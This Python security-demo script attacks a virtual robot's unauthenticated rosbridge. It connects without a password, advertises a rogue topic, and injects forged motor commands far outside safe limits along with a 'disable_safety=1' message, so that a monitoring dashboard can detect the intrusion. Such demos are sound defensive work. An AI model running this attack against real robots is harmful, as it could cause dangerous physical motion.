"""Security-demo intruder for the VIRTUAL robot only (docker compose profile
"attack"). Simulates what any device on the robot's network can do against
an unauthenticated rosbridge:
  1. connect to rosbridge on :9090 from its own IP,
  2. advertise a rogue topic (/maintenance/override),
  3. inject a forged motor command far outside the operating envelope.
It then stays connected for a while so the dashboard's Security watch has
time to see it (topic re-discovery runs every 30 s), and disconnects.

Never point this at a real robot: step 3 publishes a motor command.
"""
import os
import socket
import sys
import time

import roslibpy

HOST = os.environ.get("ROSBRIDGE_HOST", "virtual-robot")
PORT = int(os.environ.get("ROSBRIDGE_PORT", "9090"))
STAY_S = int(os.environ.get("ATTACK_STAY_S", "45"))


def log(msg):
    print(f"[attacker {time.strftime('%H:%M:%S')}] {msg}", flush=True)


me = socket.gethostbyname(socket.gethostname())
log(f"my IP: {me} - target rosbridge ws://{HOST}:{PORT}")

# Step 0: plain TCP probe first, so a firewall REJECT is reported clearly.
try:
    with socket.create_connection((HOST, PORT), timeout=3):
        log("TCP port 9090 reachable")
except OSError as e:
    log(f"BLOCKED - cannot open TCP {HOST}:{PORT}: {e}")
    log("rosbridge firewall is doing its job; attack aborted.")
    sys.exit(0)

ros = roslibpy.Ros(host=HOST, port=PORT)
try:
    ros.run(timeout=5)
except Exception as e:
    log(f"BLOCKED - rosbridge refused the WebSocket: {e}")
    sys.exit(0)
log(f"connected to rosbridge: {ros.is_connected} (no password asked)")

topics = ros.get_topics()
log(f"can list every topic ({len(topics)}): e.g. {', '.join(sorted(topics)[:4])} ...")

rogue = roslibpy.Topic(ros, "/maintenance/override", "std_msgs/String")
rogue.advertise()
log("advertised rogue topic /maintenance/override")

cmd = roslibpy.Topic(ros, "/left/front/cmd", "roboteq_msgs/Command")
cmd.advertise()
time.sleep(1.0)
for i in range(5):
    cmd.publish(roslibpy.Message({"commanded_velocity": 900.0}))
    rogue.publish(roslibpy.Message({"data": "disable_safety=1"}))
    time.sleep(0.5)
log("injected forged command: /left/front/cmd commanded_velocity = 900.0 rad/s (x5)")

log(f"staying connected {STAY_S} s ...")
time.sleep(STAY_S)
cmd.unadvertise(); rogue.unadvertise()
ros.terminate()
log("disconnected")
